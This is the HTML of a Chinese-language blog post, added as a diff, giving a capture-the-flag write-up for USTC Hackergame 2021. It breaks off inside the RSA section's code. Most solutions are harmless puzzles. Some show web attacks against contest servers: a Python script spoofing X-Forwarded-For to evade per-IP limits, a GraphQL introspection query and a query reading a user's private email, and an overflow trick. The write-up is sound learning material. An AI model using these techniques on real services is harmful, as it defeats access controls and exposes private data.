@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="此为Thomason的个人WP，官方WP：USTC-Hackergame&#x2F;hackergame2021-writeups: 中国科学技术大学第八届信息安全大赛的官方与非官方题解 (github.com)。个人战绩如下：  [TOC] 签到打开题目，是一个flag的日记，有显示时间，传入参数为?page&#x3D;。通过简单调整参数发现表示的是秒数，从1970.1.1 8:00向后加。题目要求调到比">
+<meta property="og:type" content="article">
+<meta property="og:title" content="USTC Hackgame 2021">
+<meta property="og:url" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/index.html">
+<meta property="og:site_name" content="Thomason&#39;s Blog">
+<meta property="og:description" content="此为Thomason的个人WP，官方WP：USTC-Hackergame&#x2F;hackergame2021-writeups: 中国科学技术大学第八届信息安全大赛的官方与非官方题解 (github.com)。个人战绩如下：  [TOC] 签到打开题目，是一个flag的日记，有显示时间，传入参数为?page&#x3D;。通过简单调整参数发现表示的是秒数，从1970.1.1 8:00向后加。题目要求调到比">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103144007966.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103165715029.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/hex_editor.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103171404165.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103171656102.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103173402531.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103173652547.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103200311283.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103201003986.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/travel-photo.jpg">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103201850335.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103205326244.png">
+<meta property="article:published_time" content="2021-11-04T22:45:00.000Z">
+<meta property="article:modified_time" content="2022-07-24T19:49:06.320Z">
+<meta property="article:author" content="Thomason Zhao">
+<meta property="article:tag" content="USTC Hackgame">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/assets/image-20211103144007966.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>USTC Hackgame 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/12/30/ASIS-CTF-2021/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/08/19/Tencent-Spark-Program-2021/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&text=USTC Hackgame 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&is_video=false&description=USTC Hackgame 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=USTC Hackgame 2021&body=Check out this article: https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&name=USTC Hackgame 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&t=USTC Hackgame 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E2%80%94%E2%80%94%E5%8F%82%E4%B8%8A"><span class="toc-number">2.</span> <span class="toc-text">进制十六——参上</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%BB%E5%90%A7%EF%BC%81%E8%BF%BD%E5%AF%BB%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%B5%E6%B3%A2"><span class="toc-number">3.</span> <span class="toc-text">去吧！追寻自由的电波</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94-Pro-Max"><span class="toc-number">4.</span> <span class="toc-text">猫咪问答 Pro Max</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%96%E7%93%9C"><span class="toc-number">5.</span> <span class="toc-text">卖瓜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">透明的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87"><span class="toc-number">7.</span> <span class="toc-text">旅行照片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FLAG-%E5%8A%A9%E5%8A%9B%E5%A4%A7%E7%BA%A2%E5%8C%85"><span class="toc-number">8.</span> <span class="toc-text">FLAG 助力大红包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Amnesia"><span class="toc-number">9.</span> <span class="toc-text">Amnesia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E4%B9%8B%E4%B8%8A%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">10.</span> <span class="toc-text">图之上的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-RSA"><span class="toc-number">11.</span> <span class="toc-text">Easy RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%9A%84-U-%E7%9B%98"><span class="toc-number">12.</span> <span class="toc-text">加密的 U 盘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E5%8D%9A%E5%8E%A8%E6%88%BF"><span class="toc-number">13.</span> <span class="toc-text">赛博厨房</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#minecRaft"><span class="toc-number">14.</span> <span class="toc-text">minecRaft</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        USTC Hackgame 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Thomason Zhao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-11-04T22:45:00.000Z" itemprop="datePublished">2021-11-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/USTC-Hackgame/" rel="tag">USTC Hackgame</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>此为Thomason的个人WP，官方WP：<a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2021-writeups">USTC-Hackergame&#x2F;hackergame2021-writeups: 中国科学技术大学第八届信息安全大赛的官方与非官方题解 (github.com)</a>。个人战绩如下：</p>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103144007966.png" alt="image-20211103144007966"></p>
+<p>[TOC]</p>
+<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>打开题目，是一个flag的日记，有显示时间，传入参数为<code>?page=</code>。通过简单调整参数发现表示的是秒数，从1970.1.1 8:00向后加。题目要求调到比赛时间，通过简单数学计算即可实现。</p>
+<blockquote>
+<p>  后来了解到这是Linux的时间戳，可以使用一些在线工具进行解答</p>
+</blockquote>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103165715029.png" alt="image-20211103165715029"></p>
+<h2 id="进制十六——参上"><a href="#进制十六——参上" class="headerlink" title="进制十六——参上"></a>进制十六——参上</h2><p>题目给出一个带有十六进制数据的flag文件，明文flag被处理遮挡住了，但是16进制的数据并未被遮挡。定位 f 对应的 ASCII-Hex 编码为66，向后一一解码 Hex 即可。</p>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/hex_editor.png" alt="hex_editor"></p>
+<h2 id="去吧！追寻自由的电波"><a href="#去吧！追寻自由的电波" class="headerlink" title="去吧！追寻自由的电波"></a>去吧！追寻自由的电波</h2><p>题目给出一个变调加速后的MP3文件，能够模糊听出“alpha beta”之类的单词，同时题目提示“考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。”猜测使用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/NATO_phonetic_alphabet">NATO phonetic alphabet - Wikipedia</a> 读法朗读flag内容的字母。</p>
+<p>这里笔者没有安装处理音频的软件，采用在线的一个浏览器插件解决。载入文件后直接调节速度即可，此插件自动变调减速音频。如果使用播放器进行低速播放还是会听到非常明显的小黄人音效，而且根本听不清，是因为播放器是不会对原本音频变调处理的，只做速度上的减速。</p>
+<blockquote>
+<p>  NATO phonetic alphabet 在众多战争类游戏中也有出现，比如战地五在夺取基地C时旁白播报：Take the objective Charlie. </p>
+</blockquote>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103171404165.png" alt="image-20211103171404165"></p>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103171656102.png" alt="image-20211103171656102"></p>
+<h2 id="猫咪问答-Pro-Max"><a href="#猫咪问答-Pro-Max" class="headerlink" title="猫咪问答 Pro Max"></a>猫咪问答 Pro Max</h2><p>猫咪问答，典型折磨题。题目答案都可以从互联网上找到，但是需要一些搜索技巧才能快速准确地找到答案。</p>
+<ol>
+<li>题目要求找到已经被并入中科大 Linux 用户协会（USTCLUG）的中科大信息安全俱乐部（SEC@USTC）的社团章程。题目给出了信息安全俱乐部以前的域名，想必是和这个有关。一开始尝试谷歌搜索几个关键字：“中科大信息安全俱乐部”，“章程”，“会员代表大会”，但都没有结果。域名无法打开，尝试寻找历史IP，也是无功而返。最后在好友的提醒下想到使用搜索引擎快照进行解决。<a target="_blank" rel="noopener" href="https://web.archive.org/">Wayback Machine (archive.org)</a> 通过网址输入域名查询历史快照，在快照首页找到章程。</li>
+<li>在 <a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/wiki/intro/">中国科学技术大学 Linux 用户协会 - LUG @ USTC</a> 首页即可找到评为五星社团的次数。“并于 2015 年 5 月、2017 年 7 月、2018 年 9 月、2019 年 8 月、2020 年 9 月及 2021 年 9 月被评为中国科学技术大学五星级学生社团。” 题目条件限制为近五年，因此舍去2015年那次</li>
+<li>找活动室门口牌子的字。既然题目明确表明不需要进入校园即可得到答案，依然搜索关键字：“中科大”，“西区”，“图书馆”。找到图片来源于 <a target="_blank" rel="noopener" href="https://news.ustclug.org/2016/06/new-activity-room-in-west-library/">西区图书馆新活动室启用 - USTC LUG</a> 的历史活动照片，高清无码。</li>
+<li>论文数据集查找。谷歌搜索论文，找到公开的源文件后稍微读一下论文内容即可知道答案。（或者直接根据图片数量猜测）</li>
+<li>RFC举报机制。搜索相关关键字即可找到 <a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc8962.txt">官方文档</a> 中第六节有明确指出应该发向哪里。</li>
+</ol>
+<h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p>通过6斤的瓜和9斤的瓜称出20斤，小学生都知道是称不出来的。这题有点脑筋急转弯的感觉。一开始尝试浮点数绕过，科学计数法等等操作，结果都以失败告终。但是在尝试科学计数法的时候不小心数字整大了没清零，瓜的显示直接变成浮点数了。猜测可能有溢出，溢出成负数再慢慢加回来。经过尝试，如图，正好在这个条件下的负数可以直接使用6斤的瓜称够20斤。</p>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103173402531.png" alt="image-20211103173402531"></p>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103173652547.png" alt="image-20211103173652547"></p>
+<h2 id="透明的文件"><a href="#透明的文件" class="headerlink" title="透明的文件"></a>透明的文件</h2><p>题目提示说文件是用来在终端生成五颜六色的flag。但是打开文件是一堆很奇怪的字符，有点像乱码。文件中找来找去找不到任何有关flag的线索，猜测是展示出flag并非直接在文中显示。搜索发现了一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014470361/article/details/81512330">CSDN</a>的相关介绍，但是并没有说明为什么这样就能显示彩色字体，按照文中的格式，把每个 <code>[</code> 前面都加上 <code>\033</code> 并且分行， <code>[XXm</code> 为表示的颜色字符的结尾标识部分，使用简单的shell脚本打印所有行即可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for line in `cat transparent.txt`</span><br><span class="line">do</span><br><span class="line">    echo -e &quot;$line&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  后来查到终端显示彩色字符源于一个叫 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI escape code</a> 的东西，终端把那些“奇怪”的字符序列解释为相应的指令，而不是普通字符编码。</p>
+</blockquote>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103200311283.png" alt="image-20211103200311283"></p>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103201003986.png" alt="image-20211103201003986"></p>
+<h2 id="旅行照片"><a href="#旅行照片" class="headerlink" title="旅行照片"></a>旅行照片</h2><p>这是个非常有趣的题目，题目提示没有隐写等各种奇技淫巧，就是直接答题。观察图片，题目提示左上角是一个KFC（不说我都没看到）。直接搜索蓝色KFC相关资料，查到是一个在秦皇岛的一处景点，新奥海地世界。谷歌地图查看位置，发现在图上方有一个类似港口的地方，结合地图确定拍摄者大概位置为13<del>15层，以及拍摄时间约为下午的3</del>4点，朝向东南。然后可以通过KFC官方渠道找到门店电话（或者美团什么的），至于KFC旁边的三个字可以通过这个店在地图上标注的具体位置猜测，地图的位置是…秦皇岛市…海豚馆旁。猜测是海豚馆。但是本人是找到了在停车场拍照的正门照片（忘记保存），旁边确实是海豚馆。</p>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/travel-photo.jpg" alt="img"></p>
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103201850335.png" alt="image-20211103201850335"></p>
+<h2 id="FLAG-助力大红包"><a href="#FLAG-助力大红包" class="headerlink" title="FLAG 助力大红包"></a>FLAG 助力大红包</h2><p><del>拼多多砍一刀拿flag</del> （bushi。题目要求通过不同IP访问平台砍一刀，但是每个&#x2F;8地址只允许有一个IP参与砍。直接Python写脚本使用 <code>X-Forward-For</code> 伪造IP访问，当所有&#x2F;8地址访问完之后就可以拿到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;URL&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;.0.0.1&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>:ip&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;ip&#x27;</span>:ip&#125;</span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125; <span class="comment"># 本地Burp监听，自己测试是否访问成功</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">256</span>):</span><br><span class="line">	ip = <span class="string">&#x27;.0.0.1&#x27;</span></span><br><span class="line">	ip = <span class="built_in">str</span>(i) + ip</span><br><span class="line">	<span class="built_in">print</span>(ip)</span><br><span class="line">	headers = &#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>:ip&#125;</span><br><span class="line">	data = &#123;<span class="string">&#x27;ip&#x27;</span>:ip&#125;</span><br><span class="line">	proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">	req = requests.post(url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Amnesia"><a href="#Amnesia" class="headerlink" title="Amnesia"></a>Amnesia</h2><p><strong>轻度失忆</strong></p>
+<p>题目使编译后 ELF 文件的 <code>.data</code> 和 <code>.rodata</code> 段会被清零。ELF文件中代码部分会放到 <code>.text</code> 段中，只读数据，或者不变的字符会放到 <code>.rodata</code> 段中（注意，<code>print</code> 中直接写入的字符串也会放到 <code>.rodata</code> 段中），初始化的全局变量会放到 <code>.data</code> 段中。因此使用 <code>print</code> 函数是行不通的，换一种方法，比如 <code>putchar();</code> 答案就出来了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prints hello world</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;H&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;W&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="图之上的信息"><a href="#图之上的信息" class="headerlink" title="图之上的信息"></a>图之上的信息</h2><p>搜索GraphQL相关资料以及其基础的使用和语法。参考 <a target="_blank" rel="noopener" href="https://threezh1.com/2020/05/24/GraphQL%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E5%8F%8A%E6%A1%88%E4%BE%8B/">Threezh1’Blog</a> 和 <a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf">P神的PPT</a> 即可完成题目。GraphQL实际上的查询模式与其他数据库都是大同小异，都有显而易见的基本特征。利用内省查看所有可用字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description locations args&#123;...InputValue&#125;&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后通过返回的数据直接利用payload完成攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;query&quot;:&quot;&#123; user(id:1) &#123; privateEmail &#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/04/USTC-Hackgame-2021/assets/image-20211103205326244.png" alt="image-20211103205326244"></p>
+<h2 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h2><p>参考：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">RSA加密算法</a> <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0">模逆元</a> <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0">欧拉函数</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq2539879928/article/details/106861935">Python实现密码学中的模逆运算</a> <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/compute-n-under-modulo-p/">Compute n! under modulo p - GeeksforGeeks</a></p>
+<p><strong>求 $p$</strong></p>
+<p>利用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wilson's_theorem">Wilson’s theorem - Wikipedia</a> 即可快速求出大数的的余数，尤其是当有阶乘存在的时候，参考代码： <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/compute-n-under-modulo-p/">Compute n! under modulo p - GeeksforGeeks</a>。<strong>注意别忘记最后是求出数字的下一个质数。</strong></p>
+<p><strong>求 $q$</strong></p>
+<p>$q$ 是顶级套娃，$q$ 也被加了一层RSA，但是对q加密的RSA使用了一个由多个质数相乘得到的 $N$ 。通过代码注释中给出的 <code>value[-1]</code> 便可以很容易得到整个列表数据。再通过欧拉函数作用于 $N$ 得到 $r$ ，再求 $e$ 关于 $r$ 的模逆元即可得到 $d$ 。此时就有公钥 $(N,e)$ 和私钥 $(N,d)$ 。即可进行解密操作。<strong>注意别忘记最后是求出数字的下一个质数。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 